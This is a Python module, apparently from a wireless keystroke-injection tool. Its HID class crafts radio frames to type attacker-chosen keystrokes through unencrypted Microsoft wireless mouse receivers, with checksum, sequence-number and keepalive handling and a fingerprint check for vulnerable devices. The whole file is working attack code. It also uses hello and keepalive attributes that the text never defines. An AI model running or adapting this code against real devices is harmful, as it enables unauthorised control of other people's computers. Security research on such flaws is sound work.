# -*- coding: utf-8 -*-


class HID(object):
    ''' Injection code for MS mouse '''

    def __init__(self, address, payload):
        self.address = address
        self.device_vendor = 'Microsoft'
        self.sequence_num = 0
        self.payload_template = payload[:].tolist()
        self.payload_template[4:18] = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
        self.payload_template[6] = 67

    def checksum(self, payload):
        # MS checksum algorithm - as per KeyKeriki paper
        payload[-1] = 0
        for i in range(0, len(payload) - 1):
            payload[-1] ^= payload[i]
        payload[-1] = ~payload[-1] & 0xff
        return payload

    def sequence(self, payload):
        # MS frames use a 2 bytes sequence number
        payload[5] = (self.sequence_num >> 8) & 0xff
        payload[4] = self.sequence_num & 0xff
        self.sequence_num += 1
        return payload

    def key(self, payload, key):
        payload[7] = key['mod']
        payload[9] = key['hid']
        return payload

    def frame(self, key={'hid': 0, 'mod': 0}):
        return self.checksum(self.key(self.sequence(self.payload_template[:]), key))

    def build_frames(self, attack):
        for i in range(0, len(attack)):
            key = attack[i]

            if i == 0:
                key['frames'] = [[self.hello[:], 12]]
            else:
                key['frames'] = []
            
            if i < len(attack) - 1:
                    next_key = attack[i + 1]
            else:
                next_key = None
            next_key_mod = 0
            
            if key['hid'] or key['mod']:
                key['frames'].append([self.frame(key), 12])
                key['frames'].append([self.keepalive[:], 0])
                
                if next_key and key['mod'] == next_key['mod']:
                    next_key_mod = key['mod']
                  
                if not next_key:
                    key['frames'].append([self.frame(), 0])

                elif key['hid'] == next_key['hid']:
                    dummykey = {'hid':0, 'mod': next_key_mod}
                    key['frames'].append([self.frame(dummykey), 0])

                elif next_key['sleep']:
                    key['frames'].append([self.frame(), 0])
                
            elif key['sleep']:
                count = int(key['sleep']) / 10  
                for i in range(0, int(count)):
                    key['frames'].append([self.keepalive[:], 10])
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            

    @classmethod
    def fingerprint(cls, p):
        if len(p) == 19 and (p[0] == 0x08 or p[0] == 0x0c) and p[6] == 0x40:
            # Most likely a non-XOR encrypted Microsoft mouse
            return cls
        return None

    @classmethod
    def description(cls):
        return 'Microsoft HID'
